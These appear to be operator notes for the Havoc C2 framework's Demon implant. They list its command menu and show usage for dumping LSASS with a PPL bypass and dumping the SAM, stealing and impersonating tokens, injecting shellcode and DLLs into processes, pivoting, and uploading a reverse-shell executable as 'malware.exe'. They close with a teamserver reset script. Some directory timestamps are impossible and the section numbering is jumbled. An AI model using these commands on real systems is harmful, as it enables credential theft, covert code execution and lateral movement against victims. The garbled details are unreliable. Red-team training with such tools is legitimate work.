# 02 - Help Menu

```
Demon » help

Demon Commands
==============

  Command                  Type         Description
  -------                  -------      -----------
  adcs_enum                Command      Enumerate CAs and templates in the AD using Win32 functions
  adcs_request             Command      Request an enrollment certificate
  adduser                  Command      Add a new user to a machine.
  addusertogroup           Command      Add the specified user to the specified group
  arp                      Command      Lists out ARP table
  bofbelt                  Command      A Seatbelt port using BOFs
  cacls                    Command      List user permissions for the specified file, wildcards supported
  cat                      Command      display content of the specified file
  cd                       Command      change to specified directory
  checkin                  Command      request a checkin request
  config                   Module       configure the behaviour of the demon session
  cp                       Command      copy file from one location to another
  dcenum                   Command      enumerate domain information using Active Directory Domain Services
  dir                      Command      list specified directory
  dll                      Module       dll spawn and injection modules
  domainenum               Command      Lists users accounts in the current domain
  dotnet                   Module       execute and manage dotnet assemblies
  download                 Command      downloads a specified file
  driversigs               Command      checks drivers for known edr vendor names
  enableuser               Command      Activates (and if necessary enables) the specified user account on the target computer.
  enum_filter_driver       Command      Enumerate filter drivers
  enumlocalsessions        Command      Enumerate currently attached user sessions both local and over RDP
  env                      Command      Print environment variables.
  exit                     Command      cleanup and exit
  get-asrep                Command      Enumerate a given domain for user accounts with ASREP.
  get-delegation           Command      Enumerate a given domain for different types of abusable Kerberos Delegation settings.
  get-netsession           Command      Enumerate sessions on the local or specified computer
  get-spns                 Command      Enumerate a given domain for user accounts with SPNs.
  get_password_policy      Command      Gets a server or DC's configured password policy
  help                     Command      Shows help message of specified command
  inline-execute           Command      executes an object file
  ipconfig                 Command      Lists out adapters, system hostname and configured dns serve
  job                      Module       job manager
  jump-exec                Module       lateral movement module
  kerberoast               Command      perform Kerberoasting against specified SPN
  klist                    Command      list Kerberos tickets
  ldapsearch               Command      Execute LDAP searches (NOTE: specify *,ntsecuritydescriptor as attribute parameter if you want all attributes + base64 encoded ACL of the objects, this can then be resolved using BOFHound. Could possibly break pagination, although everything seemed fine during testing.)
  listdns                  Command      lists dns cache entries
  locale                   Command      Prints locale information
  luid                     Command      get current logon ID
  mkdir                    Command      create new directory
  nanodump                 Command      Dump the LSASS process
  nanodump_ppl_dump        Command      Bypass PPL and dump LSASS
  nanodump_ppl_medic       Command      Bypass PPL and dump LSASS
  nanodump_ssp             Command      Load a Security Support Provider (SSP) into LSASS
  net                      Module       network and host enumeration module
  netGroupList             Command      List groups from the default or specified domain
  netGroupListMembers      Command      List group members from the default or specified domain
  netLclGrpLstMmbrs        Command      List local group members from the local or specified group
  netLocalGroupList        Command      List local groups from the local or specified computer
  netshares                Command      List shares on local or remote computer
  netsharesAdmin           Command      List shares on local or remote computer and gets more info then standard netshares (requires admin)
  netstat                  Command      List listening and connected ipv4 udp and tcp connections
  netuptime                Command      Returns information about the boot time on the local (or a remote) machine
  netuser                  Command      Get info about specific user. Pull from domain if a domainname is specified
  netview                  Command      lists local workstations and servers
  nslookup                 Command      Make a DNS query. DNS server is the server you want to query (do not specify or 0 for default). Record type is something like A, AAAA, or ANY
  pivot                    Module       pivoting module
  powerpick                Command      executes unmanaged powershell commands
  powershell               Command      executes powershell.exe commands and gets the output
  proc                     Module       process enumeration and management
  ptt                      Command      import Kerberos ticket into a logon session
  purge                    Command      purge a Kerberos ticket
  pwd                      Command      get current directory
  quser                    Command      Simple implementation of quser.exe usingt the Windows API
  reg_delete               Command      Deletes the registry key or value
  reg_query                Command      Query a registry value or enumerate a single key
  reg_query_recursive      Command      Recursively enumerate a key starting at path
  reg_save                 Command      Saves the registry path and all subkeys to disk
  reg_set                  Command      This command creates or sets the specified registry key (or value) on the target host.
  remove                   Command      remove file or directory
  resources                Command      list available memory and space on the primary disk drive
  routeprint               Command      prints ipv4 routes on the machine
  rportfwd                 Module       reverse port forwarding
  samdump                  Command      Dump the SAM, SECURITY and SYSTEM registries
  sc_create                Command      This command creates a service on the target host.
  sc_delete                Command      This command deletes the specified service on the target host.
  sc_description           Command      This command sets the description of an existing service on the target host.
  sc_enum                  Command      Enumerate services for qc, query, qfailure, and qtriggers info
  sc_qc                    Command      sc qc impelmentation in BOF
  sc_qdescription          Command      Queries a services description
  sc_qfailure              Command      Query a service for failure conditions
  sc_qtriggerinfo          Command      Query a service for trigger conditions
  sc_query                 Command      sc query implementation in BOF
  sc_start                 Command      This command starts the specified service on the target host.
  sc_stop                  Command      This command stops the specified service on the target host.
  schtasksenum             Command      Enumerate scheduled tasks on the local or remote computer
  schtasksquery            Command      Query the given task on the local or remote computer
  screenshot               Command      takes a screenshot
  sessions                 Command      get logon sessions
  setuserpass              Command      Sets the password for the specified user account on the target computer.
  shell                    Command      executes cmd.exe commands and gets the output
  shellcode                Module       shellcode injection techniques
  sleep                    Command      sets the delay to sleep
  socks                    Module       socks5 proxy
  task                     Module       task manager
  tasklist                 Command      This command displays a list of currently running processes on either a local or remote machine.
  tgtdeleg                 Command      retrieve a usable TGT for the current user
  token                    Module       token manipulation and impersonation
  transfer                 Command      download transfer module
  upload                   Command      uploads a specified file
  uptime                   Command      lists system boot time
  userenum                 Command      Lists user accounts on the current computer
  whoami                   Command      get the info from whoami /all without starting cmd.exe
  windowlist               Command      list windows visible on the users desktop
  wmi_query                Command      Run a wmi query and display results in CSV format
```

TODO: Categorize them systematically

```
Demon » help inline-execute

 - Command       :  inline-execute
 - Description   :  executes an object file
 - Behavior      :  API Only
 - Usage         :  inline-execute [/path/to/objectfile.o] (arguments)
 - Example       :  inline-execute /tmp/objectfile.x64.o hello

Demon » help token

 - Command       :  token
 - Description   :  token manipulation and impersonation
 - Usage         :  token [subcommand]
 - Example       :  token steal 1337

  Command                        Description
  ---------                      -------------
  getuid                         get current uid from token
  list                           list stolen tokens from token vault
  steal                          steal token from specified process and save it to token vault
  impersonate                    impersonate stolen token from specified vault id
  make                           make token from user credentials
  privs-get                      try to enable all/specified privileges from current token
  privs-list                     list all privileges from current token
  revert                         revert to default process token
  remove                         remove specified stolen token from token vault
  clear                          removes every stolen token from the token vault

Demon » help dotnet

 - Command       :  dotnet
 - Description   :  execute and manage dotnet assemblies
 - Behavior      :  API Only
 - Usage         :  dotnet [sub command]
 - Example       :  dotnet inline-execute /tmp/seatbelt.exe

  Command                        Description
  ---------                      -------------
  list-versions                  lists installed/available dotnet versions
  inline-execute                 executes assembly in the current process and gets output

Demon » help net

 - Command       :  net
 - Description   :  network and host enumeration module
 - Behavior      :  API Only
 - Usage         :  net [sub command] (args)
 - Example       :  net domain

  Command                        Description
  ---------                      -------------
  domain                         display domain for the current host
  logons                         lists users logged onto a host
  sessions                       lists sessions on a host
  share                          lists shares on a host
  localgroup                     lists local groups and users in local groups
  group                          lists groups and users in groups
  users                          lists users and user information

Demon » help config

 - Command       :  config
 - Description   :  configure the behaviour of the demon session
 - Usage         :  config [config.flag]
 - Example       :  config inject.spawn64 C:\Windows\System32\rundll32.exe

  Command                        Description
  ---------                      -------------
  implant.verbose                enable/disable implant verbose logging (process creation, memory allocation, thread execution etc.)
  implant.sleep-obf.start-addr   set custom thread start addr at sleep obfuscation
  implant.sleep-obf.technique    set custom thread start addr at sleep obfuscation
  implant.coffee.veh             enable/disable VEH for object file loading
  implant.coffee.threaded        enable/disable threading while executing object files
  memory.alloc                   memory allocation behaviour
  memory.execute                 memory executing behaviour (remote/local thread)
  inject.spoofaddr               inject code with spoofed thread start addr
  inject.spawn64                 default x64 process to spawn for fork & run operations
  inject.spawn32                 default x86 process to spawn for fork & run operations

Demon » help pivot

 - Command       :  pivot
 - Description   :  pivoting module
 - Behavior      :  API Only
 - Usage         :  pivot [sub command]
 - Example       :  pivot connect SPIDERS-PC agent_6d6e

  Command                        Description
  ---------                      -------------
  list                           list connected agent pivots
  connect                        connect to a pivoting agent
  disconnect                     disconnect from a pivoting agent
```

## 03 - Basic Commands

### 3.1 - Help Menu

```
Demon » help checkin

 - Command       :  checkin
 - Description   :  request a checkin request
```

### 3.2 - Usage

```
Demon » checkin
[*] [47DC3265] Tasked demon send back a checkin request
[+] Send Task to Agent [8 bytes]
[*] Received checkin request

Teamserver:
  - Session Path       : /home/user/Havoc/Teamserver/data/loot/agents/7486e39a

Meta Data:
  - Agent ID           : 7486e39a
  - Magic Value        : 0
  - First Call In      : 02/10/2022 15:58:30
  - Last  Call In      : 02-10-2022 15:58:55
  - AES Key            : 088a0070eca06ee6fc5caaf468f0aa04f2f264c6be9cf8cc2a92b60ca4b45ea4
  - AES IV             : a4ecf6e8c8be96ac8ebe30c84ca6f2ba
  - Sleep Delay        : 5

Host Info:
  - Host Name          : DESKTOP-85J2L4M
  - User Name          : aiden
```

#### 2.1.3 - Navigation

```
Demon » cd <directory_name>

Demon » pwd
[+] Send Task to Agent [12 bytes]
[*] Current directory: C:\Users\aiden
```

#### 2.1.3 - Sleep and Jitter

##### 2.1.3.1 - Help Menu

```
Demon » help sleep

 - Command       :  sleep
 - Description   :  sets the delay to sleep
 - Usage         :  sleep [delay]
 - Example       :  sleep 10
 - Required Args :  1
```

##### 2.1.3.2 - Usage

`Demon » sleep <seconds>`

#### 2.1.4 - List Contents

##### 2.1.4.1 - Help Menu

```
Demon » help dir

 - Command       :  dir
 - Description   :  list specified directory
 - Behavior      :  API Only
 - Usage         :  dir [/path/to/dir]
 - Example       :  dir c:\windows\system32
```

##### 2.1.4.2 - Usage

```
Demon » dir c:\
[*] [32D45E71] Tasked demon to list directory: c:\
[+] Send Task to Agent [25 bytes]
[*] List Directory: c:\\*

 Size         Type     Last Modified         Name
 ----         ----     -------------------   ----
              dir      01/10/2022 03:21:15   $Recycle.Bin
              dir      24/09/2022 13:21:14   $WinREAgent
              dir      01/10/2022 31:58:16   Config.Msi
              dir      31/08/2022 26:19:14   Documents and Settings
 12.29 kB     file     02/10/2022 55:56:15   DumpStack.log.tmp
 738.20 MB    file     02/10/2022 55:56:15   pagefile.sys
              dir      02/10/2022 38:15:12   PerfLogs
              dir      02/10/2022 29:57:12   Program Files
              dir      02/10/2022 40:57:12   Program Files (x86)
              dir      02/10/2022 36:57:12   ProgramData
              dir      16/09/2022 34:43:22   Recovery
 268.44 MB    file     02/10/2022 55:56:15   swapfile.sys
              dir      02/10/2022 46:56:15   System Volume Information
              dir      26/09/2022 29:53:15   Temp
              dir      02/10/2022 59:13:12   Users
              dir      02/10/2022 58:56:12   Windows
```

#### 2.1.5 - File Manipulation

##### 2.1.5.1 - Help Menu

```
Demon » help cp

 - Command       :  cp
 - Description   :  copy file from one location to another
 - Behavior      :  API Only
 - Usage         :  cp [/path/from/file.txt] [path/to/file.txt]
 - Example       :  cp C:\secrets.txt C:\Windows\Temp\secrets.txt

Demon » help remove

 - Command       :  remove
 - Description   :  remove file or directory
 - Behavior      :  API Only
 - Usage         :  remove [path]
 - Example       :  remove C:\text.txt

Demon » help mkdir

 - Command       :  mkdir
 - Description   :  create new directory
 - Behavior      :  API Only
 - Usage         :  mkdir [/path/to/dir]
 - Example       :  mkdir C:\NewDir

Demon » help cat

 - Command       :  cat
 - Description   :  display content of the specified file
 - Behavior      :  API Only
 - Usage         :  cat [/path/to/file.txt]
 - Example       :  cat c:\secrets.txt
```

##### 2.1.5.2 - Usage

TODO: Showcase it

#### 2.1.6 - Execute Shell Commands

##### 2.1.6.1 - Help Menu

```
Demon » help shell

 - Command       :  shell
 - Description   :  executes cmd.exe commands and gets the output
 - Behavior      :  Process Creation
 - Usage         :  shell [commands]
 - Example       :  shell dir c:\windows\system32

Demon » help powershell

 - Command       :  powershell
 - Description   :  executes powershell.exe commands and gets the output
 - Usage         :  powershell [commands]
 - Example       :  powershell dir c:\windows\system32
```

##### 2.1.6.2 - Usage

* Execute any `shell` command that the demon implant spawns a child process `cmd.exe`

`Demon » shell <command> [args]`

`Demon » shell dir /s /b c:\ | findstr "explorer.exe"`

* Spawns a child process of `powershell.exe`

`Demon » powershell <cmdlet> [args]`

#### 2.1.7 - Upload and Download Files

##### 2.1.7.1 - Help Menu

```
Demon » help download

 - Command       :  download
 - Description   :  downloads a specified file
 - Behavior      :  API Only
 - Usage         :  download [/path/to/file.txt]
 - Example       :  download c:\secrets.txt

Demon » help upload

 - Command       :  upload
 - Description   :  uploads a specified file
 - Behavior      :  API Only
 - Usage         :  upload [/local/file/to/upload.exe] [/remote/path/to/upload.exe]
 - Example       :  upload /tmp/reverse_shell.exe c:\malware.exe
```

##### 2.1.7.2 - Usage

#### 2.1.8 - Jobs Queue

##### 2.1.8.1 - Help Menu

```
Demon » help job

 - Command       :  job
 - Description   :  job manager

  Command                        Description
  ---------                      -------------
  list                           list of jobs
  suspend                        suspend specified job id
  resume                         resume specified job id
  kill                           kill specified job id

Demon » help task

 - Command       :  task
 - Description   :  task manager

  Command                        Description
  ---------                      -------------
  list                           list of commands in task queue
  clear                          clear all commands in task queue
```

##### 2.1.8.2 - Usage

`Demon » job list`

`Demon » job suspend <job_id>`

`Demon » job resume <job_id>`

`Demon » job kill <job_id>`

`Demon » task list`

`Demon » task clear`

#### 2.1.9 - Terminate Implant

`Demon » exit`

#### 2.1.3 - Process Manipulation

##### 2.1.3.1 - Help Menu

```
Demon » help proc

 - Command       :  proc
 - Description   :  process enumeration and management
 - Usage         :  proc [command]
 - Example       :  proc list

  Command                        Description
  ---------                      -------------
  list                           displays a list of running processes on the target
  kill                           kills the process from specified PID
  blockdll                       block non microsoft signed dlls
  create                         create a process
  modules                        lists loaded modules/dlls from a remote process
  grep                           grep information from the specified remote process
  memory                         query for memory regions
  find-module                    query for processes with specified loaded module
```

##### 2.1.3.2 - Create Process

`Demon » proc create notepad.exe`

`Demon » proc create taskmgr.exe`

##### 2.1.3.3 - Terminate Process

`Demon » proc kill <pid>`

##### 2.1.3.4 - Inject Process

1. **Shellcode**

* Help Menu

```
Demon » help shellcode

 - Command       :  shellcode
 - Description   :  shellcode injection techniques
 - Usage         :  shellcode [subcommand]
 - Example       :  shellcode inject-sys x64 1337 /tmp/rev_shell.x64.bin

  Command                        Description
  ---------                      -------------
  inject                         inject shellcode into a remote process
  spawn                          spawns a temporary process and injects into it
```

* Usage

`Demon » shellcode inject <x64 | x86> <pid> /path/to/shellcode.bin`

`Demon » shellcode spawn <x64 | x86> /path/to/shellcode.bin`

2. **Spawn DLL**

* Help Menu

```
Demon » help dll

 - Command       :  dll
 - Description   :  dll spawn and injection modules
 - Usage         :  dll [subcommand]
 - Example       :  dll inject 1337 /tmp/module.dll argument

  Command                        Description
  ---------                      -------------
  inject                         inject dll into a remote process
  spawn                          spawns a temporary process and injects a dll into it
```

* Usage

TODO: Fill this info

`Demon » dll inject <pid> /path/to/file.dll [arguments]`

`Demon » dll spawn /path/to/file.dll [arguments]`

## 03 - Reset Teamserver Database

`$ cat reset-teamserver.sh`

---

```bash
#!/bin/sh
echo "Stopping the Havoc TeamServer"
pid=$(ps aux | grep "havoc server" | grep -v grep | awk '{print $2}')
kill "$pid"

echo "Clearing the Database"
sqlite3 /opt/post-exploitation/Havoc/data/teamserver.db "DELETE FROM TS_Agents;"

echo "Agents cleared"
```

---
## References

- [Havoc Framework Documentation](https://havocframework.com/docs/welcome)

- [Havoc ProfileGenerator](https://github.com/0xv1n/Havoc-ProfileGenerator)